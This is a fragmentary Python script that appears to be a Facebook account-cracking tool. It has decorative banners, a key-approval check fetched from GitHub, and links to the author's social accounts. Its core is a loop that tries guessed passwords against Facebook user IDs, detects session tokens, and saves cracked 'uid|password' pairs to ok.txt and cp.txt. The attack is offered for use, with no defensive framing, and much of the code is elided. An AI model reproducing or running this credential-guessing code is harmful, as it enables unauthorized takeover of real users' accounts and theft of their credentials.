...
| \_/ | / \ | o \  | | / \ | \| |
| \_/ || o ||   /n_| || o || \\ |
|_| |_||_n_||_|\\\__/ |_n_||_|\_|
                                 

 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m SOHAN MARJAN\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1.1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
 """)
def logo2():
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1.1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : SOHAN MARJAN \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/SOHAN-MARJAN \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./error.love.1.2.3.4 \x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/SOHAN-MARJAN/approval.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/error.love.1.2.3.4")
...
def notice():
	...
	os.system("xdg-open https://m.me/error.love.1.2.3.4")
	runtxt("\033[0;97m Your Key >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Approval Neyar Jonno inbox koren ")
	os.system("xdg-open https://m.me/error.love.1.2.3.4")
	subprocess.check_output(["am", "start", "https://m.me/error.love.1.2.3.4"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/SOHAN-MARJAN/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 3.1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : SOHAN MARJAN\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/SOHAN-MARJAN \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://youtube.com/channel/UCbICx8_ve1BXPAXZUZdeMnA"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=MARJAN=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=MARJAN=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=MARJAN=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=MARJAN=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      : -- \n")
		print(" [ Sosial Medi  ] -- \n")
		print(" [*] Facebook  : https://www.facebook.com/error.love.1.2.3.4")
		print(" [*] Instagram : https://instagram.com/-- ")
		print(" [*] YouTube   : https://youtube.com/ mark marjan")
		exit(" [*] GitHub    : https://www.facebook.com/error.love.1.2.3.4 ")
	else:
		Main()
